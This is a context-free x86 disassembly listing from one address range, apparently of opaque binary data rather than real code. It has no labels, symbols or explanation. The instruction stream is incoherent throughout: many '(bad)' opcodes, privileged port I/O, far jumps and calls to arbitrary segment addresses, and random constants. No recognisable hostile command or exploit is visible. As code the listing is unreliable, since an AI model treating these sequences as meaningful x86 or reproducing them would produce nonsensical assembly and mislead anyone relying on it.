  41ad10:	imul   ebp,DWORD PTR [esi+ecx*1+0x6c],0x37186970
  41ad18:	ins    BYTE PTR es:[edi],dx
  41ad19:	data16 and al,0x5a
  41ad1c:	pop    esi
  41ad1d:	jb     0x41ad50
  41ad1f:	adc    eax,0x1f704ad0
  41ad24:	pop    ds
  41ad25:	push   ecx
  41ad26:	push   esi
  41ad27:	adc    bh,al
  41ad29:	pop    ebx
  41ad2a:	add    BYTE PTR [edi-0x4],dh
  41ad2d:	rol    DWORD PTR [esi+0x47],cl
  41ad30:	adc    bl,ch
  41ad32:	pop    ebx
  41ad33:	bound  ecx,QWORD PTR ds:0x704172f8
  41ad39:	lds    ebx,FWORD PTR [esi+0x45]
  41ad3c:	push   ecx
  41ad3d:	lds    esp,FWORD PTR [esi+0x43]
  41ad40:	jo     0x41ad0f
  41ad42:	inc    ebp
  41ad43:	add    eax,0xf6dbca0
  41ad48:	cmp    eax,DWORD PTR [ecx]
  41ad4a:	push   ecx
  41ad4b:	adc    al,0x9e
  41ad4d:	repz bound esp,QWORD PTR [ebx]
  41ad50:	lods   al,BYTE PTR ds:[esi]
  41ad51:	fdiv   QWORD PTR [eax+0x5]
  41ad54:	(bad)  
  41ad55:	jmp    0xbbb1c2c4
  41ad5a:	(bad)  
  41ad5b:	stc    
  41ad5c:	jl     0x41ad50
  41ad5e:	inc    ebp
  41ad5f:	or     BYTE PTR [eax+ebp*8-0xe842b01],cl
  41ad66:	jo     0x41ad40
  41ad68:	jecxz  0x41ad51
  41ad6a:	sub    eax,0xffdc91c8
  41ad6f:	in     al,dx
  41ad70:	nop
  41ad71:	bnd jae 0x41ad56
  41ad74:	fcmovnu st,st(5)
  41ad76:	ins    DWORD PTR es:[edi],dx
  41ad77:	int3   
  41ad78:	cmpps  xmm6,XMMWORD PTR [ecx-0x32],0xba
  41ad7d:	(bad)
  41ad83:	cmp    esi,0xf89d70da
  41ad89:	out    0x61,eax
  41ad8b:	xor    esi,edi
  41ad8d:	mov    esi,0xc6a1005e
  41ad92:	out    0x50,al
  41ad94:	test   DWORD PTR ds:0x99666e8,edx
  41ad9a:	inc    ebx
  41ad9b:	ret    
  41ad9c:	xchg   esi,eax
  41ad9d:	fisttp DWORD PTR ds:0x2b993e1
  41ada3:	stc    
  41ada4:	popa   
  41ada5:	or     DWORD PTR [edx],edi
  41ada7:	fisttp WORD PTR [ebp+edx*8-0x3]
  41adab:	in     al,0x60
  41adad:	out    0x1a,al
  41adaf:	mov    esi,0x2405ec4f
  41adb4:	jp     0x41ada0
  41adb6:	add    DWORD PTR [eax+esi*2],esp
  41adb9:	lock shl ebx,cl
  41adbc:	inc    ebx
  41adbd:	aad    0xcf
  41adbf:	fisttp QWORD PTR [ebp-0x43]
  41adc2:	mov    ebp,0xbfc31cdc
  41adc7:	repz or al,bh
  41adca:	call   0x22e5:0xcdbb9ed3
  41add1:	fadd   st,st(7)
  41add3:	icebp  
  41add4:	adc    edi,DWORD PTR [ebp-0xfee2364]
  41adda:	mov    al,0xdf
  41addd:	repz mov dl,0x5
  41ade1:	out    dx,al
  41ade2:	xchg   esi,eax
  41ade3:	clc    
  41ade4:	loop   0x41add7
  41ade6:	jl     0x41adce
  41ade8:	or     bh,BYTE PTR [eax-0xe072271]
  41adee:	jbe    0x41adbf
  41adf0:	retf   
  41adf1:	fidivr DWORD PTR [ebx-0x31]
  41adf4:	add    al,bl
  41adf6:	out    dx,eax
  41adf7:	mov    dl,dh
  41adf9:	inc    esi
  41adfa:	mov    ebx,0x8d3f84f
  41adff:	xor    al,0xf1
  41ae01:	rcr    edx,cl
  41ae03:	pop    ds
  41ae04:	enter  0xd82e,0x44
  41ae08:	loopne 0x41ad91
  41ae0a:	call   0xf0c2b248
  41ae0f:	cmp    al,bh
  41ae11:	push   ss
  41ae12:	(bad)  
  41ae13:	inc    DWORD PTR [ebp+0x11]
  41ae16:	in     al,dx
  41ae17:	bound  edi,QWORD PTR [ebx]
  41ae19:	sub    eax,0x1713752f
  41ae1e:	pusha  
  41ae1f:	jbe    0x41ae31
  41ae21:	xlat   BYTE PTR ds:[ebx]
  41ae22:	jmp    0xbe22:0x910d477
  41ae29:	adc    al,0x9
  41ae2b:	pop    esp
  41ae2c:	and    dl,dl
  41ae2e:	in     eax,dx
  41ae2f:	arpl   WORD PTR [eax*8+0x12f04c5f],ax
  41ae36:	(bad)  
  41ae37:	push   ebx
  41ae38:	sbb    DWORD PTR ds:0xd8d671d9,ebp
  41ae3e:	jmp    0xc06d:0xe814d560
  41ae45:	xor    ch,BYTE PTR [edi]
  41ae47:	js     0x41ae05
  41ae49:	xchg   BYTE PTR [edi+0x7a],bl
  41ae4c:	(bad)  
  41ae4d:	mov    WORD PTR [ebp-0x8],0x1a5d
  41ae53:	xor    BYTE PTR [ebx+esi*2],al
  41ae56:	cs inc esi
  41ae58:	sti    
  41ae59:	add    BYTE PTR [edi],ah
  41ae5b:	adc    eax,0x344ae144
  41ae60:	aaa    
  41ae61:	fstp   TBYTE PTR [ebx+ecx*8]
  41ae64:	sub    bl,al
  41ae66:	daa    
  41ae67:	pop    ss
  41ae68:	cmp    BYTE PTR [edi-0x47ca358d],ah
  41ae6e:	jbe    0x41ae39
  41ae70:	xor    al,0x7c
  41ae72:	xor    cl,bh
  41ae74:	ins    BYTE PTR es:[edi],dx
  41ae75:	jg     0x41aeca
  41ae77:	lds    edx,FWORD PTR [ebx-0x67]
  41ae7a:	and    al,0xe5
  41ae7c:	popa   
  41ae7d:	jmp    0x3a8f74f0
  41ae82:	push   esp
  41ae83:	in     eax,0x73
  41ae85:	pop    esi
  41ae86:	adc    bl,cl
  41ae88:	bound  ebp,QWORD PTR ds:0x75ede7
  41ae8e:	imul   eax,DWORD PTR [edi+0x51],0x6afd0850
  41ae95:	gs jns 0x41af00
  41ae98:	pusha  
  41ae99:	outs   dx,DWORD PTR ds:[esi]
  41ae9a:	cmp    eax,0x3b00713f
  41ae9f:	push   0x69
  41aea1:	je     0x41aeab
  41aea3:	or     eax,DWORD PTR [eax]
  41aea5:	add    al,bl
  41aea7:	or     al,BYTE PTR [eax]
  41aea9:	add    al,bl
  41aeab:	sub    al,0x0
  41aead:	cmp    al,0x7
  41aeaf:	or     edi,DWORD PTR [eax+edx*2]
  41aeb2:	pop    es
  41aeb3:	xor    eax,0x6a285f30
  41aeb8:	jo     0x41af2d
  41aeba:	mov    edi,0x646f3d
  41aebf:	sbb    al,BYTE PTR ds:0x3685533c
  41aec5:	dec    ebp
  41aec6:	pop    edi
  41aec7:	call   0x7fb51f37
  41aecc:	cmp    eax,0xa9a646f
  41aed1:	cmp    al,0x49
  41aed3:	lds    ecx,FWORD PTR [ebx+0x4d]
  41aed6:	pop    edi
  41aed7:	test   al,0x6b
  41aed9:	jo     0x41af4e
  41aedb:	mov    edi,0x5a646f3d
  41aee0:	or     bh,BYTE PTR [eax+ecx*2]
  41aee3:	mov    esp,0xb94d4d36
  41aee8:	inc    ebx
  41aee9:	imul   ebx,DWORD PTR [edi-0x58],0xdf73706b
  41aef0:	cmp    al,0x6f
  41aef2:	fs call 0x6043:0x955c000a
  41aefa:	jb     0x41aec3
  41aefc:	pop    eax
  41aefd:	ins    BYTE PTR es:[edi],dx
  41aefe:	data16 fcom QWORD PTR [eax+0x54]
  41af02:	imul   esp,esi,0x31776c68
  41af08:	ret    
  41af09:	and    ecx,DWORD PTR [eax+ebx*4-0x4a]
  41af0d:	ficomp WORD PTR [edi]
  41af0f:	ins    BYTE PTR es:[edi],dx
  41af10:	rcr    edx,1
  41af12:	imul   esi,DWORD PTR [ecx],0x3
  41af15:	fldenv [ebp-0x7b]
  41af18:	pop    ds
  41af19:	jecxz  0x41af8c
  41af1b:	mov    WORD PTR [edi+esi*4],cs
  41af1e:	xchg   dx,ax
  41af20:	add    bl,cl
  41af22:	jo     0x41af24
  41af24:	xchg   BYTE PTR [esi],al
  41af26:	lock pop ebx
  41af28:	xchg   BYTE PTR [ecx],cl
  41af2a:	fisub  DWORD PTR [ebx+0x56]
  41af2d:	div    esp
  41af2f:	pop    ds
  41af30:	ins    DWORD PTR es:[edi],dx
  41af31:	stc    
  41af32:	icebp  
  41af33:	bound  edx,QWORD PTR [ecx]
  41af35:	sub    eax,0x705d66e3
  41af3a:	lds    ecx,FWORD PTR [edx+0x58]
  41af3d:	adc    esi,esi
  41af3f:	ins    BYTE PTR es:[edi],dx
  41af40:	inc    edx
  41af41:	aaa    
  41af42:	fbstp  TBYTE PTR [ebx+0x55]
  41af45:	xchg   edi,eax
  41af46:	fsubr  QWORD PTR [ebp+0x15]
  41af49:	inc    edi
  41af4a:	bnd jo 0x41af9e
  41af4d:	jge    0x41af33
  41af4f:	or     ax,0xd670
  41af53:	ins    BYTE PTR es:[edi],dx
  41af54:	sete   dl
  41af57:	pop    esi
  41af58:	add    ecx,DWORD PTR [ebp-0x3b]
  41af5b:	dec    edx
  41af5c:	sbb    BYTE PTR [ebx-0xd],dl
  41af5f:	ins    BYTE PTR es:[edi],dx
  41af60:	add    dh,BYTE PTR [edi-0x21]
  41af63:	jae    0x41af3a
  41af65:	xchg   esi,eax
  41af66:	fsubr  QWORD PTR [ebp-0x2b]
  41af69:	xchg   dl,dh
  41af6b:	jo     0x41af7e
  41af6d:	jge    0x41af53
  41af6f:	data16 int 0x6f
  41af72:	(bad)  
  41af73:	ins    BYTE PTR es:[edi],dx
  41af74:	iret   
  41af75:	shl    ecx,cl
  41af77:	pop    esi
  41af78:	ret    
  41af79:	mov    ebp,es
  41af7b:	push   ecx
  41af7c:	fcomp  st(4)
  41af7e:	ret    
  41af7f:	jno    0x41af46
  41af81:	or     BYTE PTR [edx-0x38],bl
  41af84:	lock sbb bh,BYTE PTR [ebx]
  41af87:	xlat   BYTE PTR ds:[ebx]
  41af88:	add    BYTE PTR [ebx-0x6b22a52b],dl
  41af8e:	in     al,0x59
  41af90:	add    al,0x75
  41af92:	jmp    0x438:0xf272e53a
  41af99:	jne    0x41af85
  41af9b:	cmp    ah,ch
  41af9d:	jb     0x41af91
  41af9f:	cmp    dh,al
  41afa1:	pop    edi
  41afa2:	lock out 0xb8,al
  41afa5:	push   edi
  41afa6:	repnz or ah,dh
  41afa9:	pop    ebp
  41afaa:	loope  0x41af70
  41afac:	fcom   QWORD PTR [edx+esi*8-0x1a]
  41afb0:	(bad)  
  41afb1:	dec    ebp
  41afb2:	jecxz  0x41afae
  41afb4:	bnd ja 0x41af8e
  41afb7:	add    ecx,eax
  41afb9:	jle    0x41afa7
  41afbb:	or     ebx,ebx
  41afbd:	es mov eax,0xe642f6ef
  41afc3:	shl    esi,cl
  41afc5:	push   ss
  41afc6:	ror    ah,cl
  41afc8:	out    0xae,al
  41afca:	int3   
  41afcb:	(bad)  
  41afcc:	out    dx,eax
  41afcd:	push   cs
  41afce:	or     DWORD PTR [ebx-0x2a17f22d],ebp
  41afd4:	(bad)  
  41afd5:	pop    ds
  41afd6:	fdiv   DWORD PTR [edx-0x3fd4e420]
  41afdc:	(bad)  [edi]
  41afde:	or     DWORD PTR [edi-0x671bf20b],edx
  41afe4:	in     al,0xb
  41afe6:	or     DWORD PTR [ebx-0x49161d1c],esp
  41afec:	in     al,0x0
  41afee:	loop   0x41afe0
  41aff0:	out    0xe4,al
  41aff2:	shl    edi,1
  41aff4:	xchg   ebp,eax
  41aff5:	lock (bad) 
  41aff7:	aam    0x79
  41aff9:	sbb    esi,edx
  41affb:	jmp    0x7e4f:0xbd327fff
  41b002:	push   edi
  41b003:	in     eax,dx
  41b004:	push   0x48
  41b006:	pop    edx
  41b007:	lock (bad) 
  41b009:	cmp    DWORD PTR [eax],ecx
  41b00b:	out    0x73,al
  41b00d:	pop    esi
  41b00e:	adc    bl,dl
  41b010:	bound  ebp,QWORD PTR ds:0x3b60edda
  41b016:	mul    bh
  41b018:	data16 sub al,0x12
  41b01b:	jecxz  0x41b088
  41b01d:	jmp    0x40a09ee9
  41b022:	fstp   DWORD PTR [edx]
  41b024:	fs or  eax,0x1a70e6ff
  41b02a:	xor    eax,0x50a62b5
  41b02f:	out    dx,al
  41b030:	ins    BYTE PTR es:[edi],dx
  41b031:	std    
  41b032:	stc    
  41b033:	in     al,0x76
  41b035:	jmp    0x1ab19d3c
  41b03a:	out    dx,al
  41b03b:	fnstenv [ebp+0xc]
  41b03e:	mov    edi,0xc2fe4d5b
  41b043:	retf   
  41b044:	ins    BYTE PTR es:[edi],dx
  41b045:	fcmovnb st,st(6)
  41b047:	pop    ebx
  41b048:	dec    ebp
  41b049:	into   
  41b04a:	mov    ds:0x89ca611a,al
  41b04f:	(bad)  
  41b050:	ins    DWORD PTR es:[edi],dx
  41b051:	aad    0x0
  41b053:	xor    bh,BYTE PTR [ecx-0x457d4694]
  41b059:	jo     0x41b015
  41b05b:	sub    esp,0xba32cd71
  41b061:	push   0xffffffb5
  41b063:	cmp    BYTE PTR [eax-0x197f649e],0x71
  41b06a:	jmp    0x99b59ef4
  41b06f:	sub    ah,0x71
  41b072:	xchg   ebp,eax
  41b073:	xor    bh,BYTE PTR [edx+0x57d4006a]
  41b079:	arpl   WORD PTR ds:[ebx-0x3b918dc0],di
  41b080:	pop    es
  41b081:	dec    edi
  41b082:	ins    DWORD PTR es:[edi],dx
  41b083:	les    edx,FWORD PTR [edi+0x4d]
  41b086:	popa   
  41b087:	fist   DWORD PTR [ebp+0x74]
  41b08a:	outs   dx,DWORD PTR ds:[esi]
  41b08b:	mov    ch,BYTE PTR [ecx-0x3]
  41b08e:	pusha  
  41b08f:	jnp    0x41b0f5
  41b091:	ins    BYTE PTR es:[edi],dx
  41b092:	jne    0x41b0f2
  41b094:	pop    ecx
  41b095:	sub    esp,DWORD PTR [ebx+0x66]
  41b098:	push   0x647b60fd
  41b09d:	ins    BYTE PTR es:[edi],dx
  41b09e:	jne    0x41b10e
  41b0a0:	pop    ecx
  41b0a1:	sub    esp,DWORD PTR [ebx+0x76]
  41b0a4:	aas    
  41b0a5:	std    
  41b0a6:	pop    ebx
  41b0a7:	dec    edx
  41b0a8:	data16 jno 0x41b0f8
  41b0ab:	cmp    DWORD PTR [esi],edi
  41b0ad:	imul   eax,DWORD PTR [eax],0x6565391c
  41b0b3:	call   0xb60efc
  41b0b8:	jmp    0x36b0ffc3
  41b0bd:	pop    ecx
  41b0be:	je     0x41b121
  41b0c0:	retf   0x593b
  41b0c3:	push   edx
  41b0c4:	adc    DWORD PTR [ecx],edi
  41b0c6:	pop    ecx
  41b0c7:	push   esp
  41b0c8:	loopne 0x41b105
  41b0ca:	sbb    eax,0x1e6a7942
  41b0cf:	add    bl,ch
  41b0d1:	inc    ecx
  41b0d2:	arpl   WORD PTR [edi+eax*4+0x67],si
  41b0d6:	outs   dx,DWORD PTR ds:[esi]
  41b0d7:	gs int3 
  41b0d9:	xor    al,0x46
  41b0db:	push   esp
  41b0dc:	lods   al,BYTE PTR ds:[esi]
  41b0dd:	dec    edx
  41b0de:	gs cmp BYTE PTR gs:[ebx+0x5e],al
  41b0e3:	je     0x41b10e
  41b0e5:	push   ecx
  41b0e6:	push   edx
  41b0e7:	jae    0x41b08e
  41b0e9:	push   esp
  41b0ea:	jo     0x41b10c
  41b0ec:	mov    ah,0x3b
  41b0ee:	ins    DWORD PTR es:[edi],dx
  41b0ef:	outs   dx,DWORD PTR ds:[esi]
  41b0f0:	xor    DWORD PTR [ecx+eax*1+0x55],edi
  41b0f4:	into   
  41b0f5:	jge    0x41b0d3
  41b0f7:	data16 (bad) 
  41b0f9:	mov    ah,BYTE PTR [ecx]
  41b0fb:	inc    esp
  41b0fc:	fcomp  st(5)
  41b0fe:	frstor [eax-0x43]
  41b101:	xor    bl,0x76
  41b104:	xor    DWORD PTR [eax-0x4231930d],eax
  41b10a:	loop   0x41b176
  41b10c:	jne    0x41b0c7
  41b10e:	icebp  
  41b10f:	push   DWORD PTR [ebx-0x3d]
  41b112:	out    dx,al
  41b113:	ins    DWORD PTR es:[edi],dx
  41b114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b115:	jo     0x41b0d4
  41b117:	bound  ecx,QWORD PTR [edi+0x6beed1]
  41b11d:	test   DWORD PTR [eax-0x43],esi
  41b120:	adc    WORD PTR [eax],0x21
  41b124:	and    edx,DWORD PTR [ebp+0x5d4ad270]
  41b12a:	and    BYTE PTR [ebx+eax*2],ah
  41b12d:	pop    esp
  41b12e:	adc    ebx,ebx
  41b130:	imul   edx,DWORD PTR [ecx],0x31
  41b133:	loopne 0x41b198
  41b135:	arpl   WORD PTR ds:0xff3170f1,ax
  41b13b:	mov    dh,0x53
  41b13d:	popa   
  41b13e:	push   eax
  41b13f:	shl    BYTE PTR [edx+0x43],cl
  41b142:	pop    edx
  41b143:	loopne 0x41b1b6
  41b145:	xor    DWORD PTR [eax],eax
  41b147:	mov    ch,0x4f
  41b149:	add    dl,BYTE PTR [eax]
  41b14b:	shl    DWORD PTR [edx+0x23],1
  41b14e:	xor    ah,al
  41b150:	jno    0x41b183
  41b152:	mov    al,ds:0x10624fb6
  41b157:	iret   
  41b158:	jo     0x41b166
  41b15a:	sahf   
  41b15b:	and    DWORD PTR [esi+0x10],ecx
  41b15e:	dec    ebp
  41b15f:	loopne 0x41b160
  41b161:	jecxz  0x41b107
  41b163:	int    0x4f
  41b165:	push   ecx
  41b166:	jne    0x41b15a
  41b168:	bound  eax,QWORD PTR [ebx]
  41b16a:	or     edi,eax
  41b16c:	mov    ch,0xf
  41b16e:	in     al,dx
  41b16f:	add    DWORD PTR [ebx],0xfffffff7
  41b172:	retf   0xd3ba
  41b175:	les    edi,FWORD PTR ds:[ebx-0x1c]
  41b179:	iret   
  41b17a:	in     al,dx
  41b17b:	mov    ah,0xd2
  41b17e:	in     al,0x78
  41b180:	loopne 0x41b182
  41b182:	rcl    ebp,0xe6
  41b185:	mov    ch,0xec
  41b187:	mov    ah,0x96
  41b189:	and    esp,edx
  41b18b:	aad    0x4b
  41b18d:	repnz dec esi
  41b18f:	mov    DWORD PTR [edi-0x27],0xb6250993
  41b196:	cmp    BYTE PTR [ecx-0x246c2cfa],0x3c
  41b19d:	loope  0x41b11f
  41b19f:	or     DWORD PTR [eax],esi
  41b1a1:	mov    ecx,0xd306b947
  41b1a6:	xchg   ebx,eax
  41b1a7:	(bad)  [ecx+eiz*8]
  41b1aa:	or     BYTE PTR [ecx],0x30
  41b1ad:	mov    ecx,0xd0c6b92f
  41b1b2:	popa   
  41b1b3:	out    dx,al
  41b1b4:	sbb    BYTE PTR [edi+ebp*2],ah
  41b1b7:	jmp    0xe513:0xcdd6e0fb
  41b1be:	push   edi
  41b1bf:	in     eax,0xe6
  41b1c1:	mov    ebx,0x2416bd62
  41b1c6:	(bad)  
  41b1c7:	fadd   QWORD PTR [ebx]
  41b1c9:	repnz mov dh,0xd0
  41b1cc:	mov    edx,0xba28fecf
  41b1d1:	loopne 0x41b1f3
  41b1d3:	(bad)  
  41b1d5:	icebp  
  41b1d6:	ds mov esi,0xc896b7b8
  41b1dc:	mov    ch,0xd3
  41b1de:	inc    ecx
  41b1df:	sub    DWORD PTR [edx+esi*8-0x170024ed],edx
  41b1e6:	add    BYTE PTR [ebp+0x52993ec3],bh
  41b1ec:	mov    esp,0x58608c70
  41b1f1:	inc    ebp
  41b1f2:	mov    ch,0x76
  41b1f4:	enter  0x884a,0x7d
  41b1f8:	in     al,0x1f
  41b1fa:	mov    ah,0x63
  41b1fc:	jmp    0x41b26f
  41b1fe:	leave  
  41b1ff:	test   BYTE PTR [edi-0x3ecd7b96],dh
  41b205:	push   ebx
  41b206:	popf   
  41b207:	(bad)
  41b20c:	clc    
  41b20d:	push   eax
  41b20e:	dec    esp
  41b20f:	and    ebx,esi
  41b211:	bound  ebx,QWORD PTR [ebx+0x2d]
  41b214:	mov    edx,0xf8053d4a
  41b219:	push   edx
  41b21a:	pop    edx
  41b21b:	neg    cl
  41b21d:	(bad)  
  41b21e:	call   0xfa917705
  41b223:	push   edx
  41b224:	mov    ecx,0x58013b6c
  41b229:	push   edx
  41b22a:	sbb    al,0xe1
  41b22c:	(bad)  
  41b22d:	pop    ds
  41b22e:	cmp    DWORD PTR [edx+ebx*8],eax
  41b231:	jae    0x41b21c
  41b233:	stos   DWORD PTR es:[edi],eax
  41b234:	ret    0x393e
  41b237:	adc    eax,0xe11b6cb9
  41b23c:	push   edi
  41b23d:	std    
  41b23e:	sbb    DWORD PTR [edi+eax*8-0x491d36d0],eax
  41b245:	jo     0x41b241
  41b247:	int    0xe4
  41b249:	jno    0x41b250
  41b24b:	add    BYTE PTR [ebx],al
  41b24d:	or     DWORD PTR [edi-0x4c],eax
  41b250:	jae    0x41b219
  41b252:	pop    ds
  41b253:	mov    ecx,0xde70d893
  41b258:	test   ecx,ebx
  41b25a:	arpl   WORD PTR [ebx],bx
  41b25c:	sub    eax,0xac004dc7
  41b261:	cmp    ebx,DWORD PTR ds:0x70587950
  41b267:	ja     0x41b2e0
  41b269:	pop    ecx
  41b26a:	popa   
  41b26b:	xor    cl,BYTE PTR [eax-0x57abae6d]
  41b271:	sahf   
  41b272:	pop    esi
  41b273:	imul   esi,DWORD PTR [ebx+ebp*1+0x58bb6150],0x37ba6f74
  41b27e:	das    
  41b27f:	add    BYTE PTR [ebx+0x7850519e],ch
  41b285:	cmp    ebx,DWORD PTR [esi+0x73]
  41b288:	mov    ebx,0xac726c64
  41b28d:	sbb    DWORD PTR [eax],eax
  41b28f:	add    BYTE PTR [eax-0x64],ch
  41b292:	dec    ebp
  41b293:	xor    edi,DWORD PTR [eax]
  41b295:	cmp    eax,0x647b735e
  41b29a:	ins    BYTE PTR es:[edi],dx
  41b29b:	jb     0x41b309
  41b29d:	or     eax,0x3d594d45
  41b2a2:	sbb    eax,0x70587950
  41b2a7:	ja     0x41b320
  41b2a9:	pop    ebx
  41b2aa:	popa   
  41b2ab:	add    BYTE PTR [esi],dl
  41b2ad:	lahf   
  41b2ae:	push   ecx
  41b2af:	push   eax
  41b2b0:	add    al,bh
  41b2b2:	cmp    bl,BYTE PTR [esi+0x73]
  41b2b5:	dec    ebx
  41b2b6:	fs ins BYTE PTR es:[edi],dx
  41b2b8:	jb     0x41b2e6
  41b2ba:	or     eax,0x3d1c5448
  41b2bf:	sbb    eax,0x70583950
  41b2c4:	ja     0x41b2fd
  41b2c6:	pop    ebx
  41b2c7:	popa   
  41b2c8:	add    BYTE PTR [ebx],bl
  41b2ca:	sahf   
  41b2cb:	push   ecx
  41b2cc:	push   eax
  41b2cd:	call   0x8bb5110c
  41b2d2:	gs ins BYTE PTR es:[edi],dx
  41b2d4:	jb     0x41b342
  41b2d6:	or     al,BYTE PTR [eax]
  41b2d8:	push   ebx
  41b2d9:	xor    DWORD PTR [edi-0x25],ecx
  41b2dc:	jae    0x41b2fc
  41b2de:	inc    ecx
  41b2df:	out    dx,eax
  41b2e0:	(bad)  
  41b2e1:	in     eax,dx
  41b2e2:	pushf  
  41b2e3:	fisub  DWORD PTR [eax+0x3]
  41b2e6:	inc    edi
  41b2e7:	lock ins BYTE PTR es:[edi],dx
  41b2e9:	pop    ss
  41b2ea:	xchg   esp,eax
  41b2eb:	lds    eax,FWORD PTR [esi+0x7]
  41b2ee:	pushf  
  41b2ef:	fidiv  WORD PTR [ecx-0x21]
  41b2f2:	test   ch,ch
  41b2f4:	pop    ds
  41b2f5:	lock and al,0x6c
  41b2f9:	in     al,0x8d
  41b2fb:	in     eax,dx
  41b2fc:	pop    ds
  41b2fd:	in     al,0x80
  41b2ff:	rcr    DWORD PTR [esi-0x2a],cl
  41b302:	test   bh,ch
  41b304:	pop    ebx
  41b305:	lock and al,0x6c
  41b309:	les    ecx,FWORD PTR [ebp-0x56ce8f13]
  41b30f:	frstor [edx-0x61]
  41b312:	mov    ah,0xea
  41b314:	jae    0x41b316
  41b316:	cwde   
  41b317:	int    0xd4
  41b319:	inc    DWORD PTR [ebx-0x618c1631]
  41b31f:	rcl    ebp,0x62
  41b322:	ins    DWORD PTR es:[edi],dx
  41b323:	sbb    eax,0xc78360eb
  41b328:	aam    0x6c
  41b32a:	xchg   edi,eax
  41b32b:	adc    al,0xc0
  41b32d:	dec    esp
  41b32e:	(bad)  
  41b32f:	into   
  41b330:	jmp    0x5d72:0xd0cc5460
  41b337:	add    al,0xf1
  41b339:	ins    BYTE PTR es:[edi],dx
  41b33a:	dec    edx
  41b33b:	sbb    al,0xd1
  41b33d:	dec    edx
  41b33e:	push   0x5260c440
  41b343:	call   esi
  41b345:	ins    DWORD PTR es:[edi],dx
  41b346:	cmp    eax,0x4f5ed040
  41b34b:	add    ecx,ebp
  41b34d:	bound  eax,QWORD PTR [ebx+0x4]
  41b350:	ret    
  41b351:	pusha  
  41b352:	adc    cl,BYTE PTR [ecx]
  41b354:	(bad)  
  41b355:	fcom   DWORD PTR [ebx*8-0x19fffc27]
  41b35c:	int3   
  41b35d:	xlat   BYTE PTR ds:[ebx]
  41b35e:	sbb    eax,0xeae8d8e8
  41b363:	ret    
  41b364:	iret   
  41b365:	out    0x0,al
  41b367:	out    0xb9,al
  41b369:	repnz adc al,0xdd
  41b36c:	xchg   edx,eax
  41b36d:	mov    edx,0xf2c2e70f
  41b372:	in     eax,0xd9
  41b374:	(bad)  
  41b375:	rol    DWORD PTR [edx],1
  41b377:	mov    ch,0xa9
  41b379:	fadd   DWORD PTR [eax]
  41b37b:	loopne 0x41b357
  41b37d:	mov    esi,ecx
  41b37f:	loop   0x41b33f
  41b381:	adc    ebp,0xffffffc1
  41b384:	fist   WORD PTR [ebp-0x7042150f]
  41b38a:	icebp  
  41b38b:	shl    ch,cl
  41b38d:	jge    0x41b365
  41b38f:	push   ss
  41b390:	les    eax,FWORD PTR [ebx+0x4deaa1d6]
  41b396:	in     eax,dx
  41b397:	xchg   esp,eax
  41b398:	in     al,dx
  41b399:	push   es
  41b39a:	mov    bh,0xa3
  41b39c:	out    0x59,eax
  41b39e:	frstor [ecx+0x6af143dd]
  41b3a4:	mov    ecx,0xe28cf338
  41b3a9:	dec    edx
  41b3aa:	jmp    0xed656930
  41b3af:	xchg   ecx,eax
  41b3b0:	xlat   BYTE PTR ds:[ebx]
  41b3b1:	cmp    eax,0x1aeb5dd7
  41b3b6:	and    al,0x74
  41b3b8:	ficom  WORD PTR [edx]
  41b3ba:	lock dec ebp
  41b3bc:	in     al,0x1
  41b3be:	and    al,0x6e
  41b3c0:	jecxz  0x41b3d4
  41b3c2:	jmp    0xd84d9707
  41b3c7:	es mov eax,0xe242d803
  41b3cd:	inc    DWORD PTR [esi]
  41b3cf:	retf   0xffd9
  41b3d2:	sbb    DWORD PTR [edx-0x72218c12],esp
  41b3d8:	fisub  DWORD PTR [edx-0x43]
  41b3db:	sub    ebx,0xa300db60
  41b3e1:	fldcw  WORD PTR [edi+eax*8+0x66]
  41b3e5:	mov    al,0x54
  41b3e7:	rol    BYTE PTR [eax+0x67b66ce8],1
  41b3ed:	hlt    
  41b3ee:	dec    ebp
  41b3ef:	popf   
  41b3f0:	mov    dh,0xc9
  41b3f2:	jb     0x41b3af
  41b3f4:	test   bh,ah
  41b3f6:	ins    DWORD PTR es:[edi],dx
  41b3f7:	popf   
  41b3f8:	test   al,0xe7
  41b3fa:	jno    0x41b396
  41b3fc:	dec    ebp
  41b3fd:	in     eax,0x6d
  41b3ff:	mov    ch,0x9b
  41b401:	jmp    0x41b470
  41b403:	test   DWORD PTR [ebx-0x23],eax
  41b406:	jo     0x41b3d1
  41b408:	popa   
  41b409:	out    0x70,eax
  41b40b:	jp     0x41b462
  41b40d:	in     eax,dx
  41b40e:	xchg   WORD PTR [ebx-0xc],cx
  41b412:	push   eax
  41b413:	je     0x41b429
  41b415:	fnstenv [esi+0x5a]
  41b418:	or     edi,esp
  41b41a:	push   0x3d
  41b41c:	in     eax,0xd9
  41b41e:	ins    BYTE PTR es:[edi],dx
  41b41f:	dec    edi
  41b420:	or     ah,al
  41b422:	bound  ebx,QWORD PTR [edx-0xf]
  41b425:	les    esi,FWORD PTR [edx+0x3d]
  41b428:	add    ebp,esp
  41b42a:	ins    BYTE PTR es:[edi],dx
  41b42b:	push   edx
  41b42c:	xor    eax,0xd94f6cba
  41b431:	fcomp  QWORD PTR [esi+0x3b]
  41b434:	(bad)  
  41b435:	scas   eax,DWORD PTR es:[edi]
  41b436:	dec    edx
  41b437:	adc    ah,cl
  41b439:	fldcw  WORD PTR [edx+ebx*1-0x20]
  41b43d:	in     eax,dx
  41b43e:	jae    0x41b475
  41b440:	jmp    0xe5e7:0x473e5
  41b447:	bound  eax,QWORD PTR [eax]
  41b449:	les    esp,FWORD PTR [edi]
  41b44b:	cmp    eax,0x725a2b63
  41b450:	outs   dx,BYTE PTR ds:[esi]
  41b451:	mov    ah,0x27
  41b453:	dec    ecx
  41b454:	popa   
  41b455:	scas   al,BYTE PTR es:[edi]
  41b456:	data16 fs mov al,BYTE PTR gs:[edi]
  41b45b:	dec    ebx
  41b45c:	jne    0x41b3e2
  41b45e:	arpl   WORD PTR [edi+ebp*2+0x73],bp
  41b462:	pop    es
  41b463:	pop    esp
  41b464:	inc    ecx
  41b465:	jnp    0x41b4d3
  41b467:	ins    BYTE PTR es:[edi],dx
  41b468:	jne    0x41b4c8
  41b46a:	cmp    esi,DWORD PTR [eax+0x0]
  41b46d:	popa   
  41b46e:	imul   esp,DWORD PTR [edx+0x6e],0xffffffb4
  41b472:	pop    esi
  41b473:	arpl   WORD PTR [ecx+0x7b],bp
  41b476:	data16 jno 0x41b4e2
  41b479:	mov    edi,0xb468fd59
  41b47e:	push   0x6b
  41b480:	je     0x41b433
  41b482:	cmp    esi,DWORD PTR [esi+0x6d]
  41b485:	mov    bh,0x3d
  41b487:	std    
  41b488:	push   0x63716a9e
